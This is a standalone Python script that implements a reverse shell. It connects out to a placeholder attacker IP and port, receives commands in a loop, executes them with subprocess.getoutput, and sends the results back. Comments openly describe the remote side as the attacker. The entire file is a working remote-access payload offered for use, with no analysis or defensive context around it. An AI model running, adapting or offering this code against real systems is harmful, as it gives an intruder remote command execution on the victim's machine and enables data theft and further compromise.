#!/usr/bin/env python3
import socket
import subprocess

def reverse_shell():
    HOST = "192.168.1.100"  # Replace with your attacker's IP
    PORT = 4444             # Replace with your listener's port

    try:
        # Connect to the attacker
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        print(f"[+] Connection established to {HOST}:{PORT}")  # Print connection confirmation

        while True:
            # Receive command from the attacker
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                print("[+] Connection closed by the attacker.")  # Notify on exit
                break  # Exit the shell on the 'exit' command

            # Execute the command and capture output
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))  # Send the output back

    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()
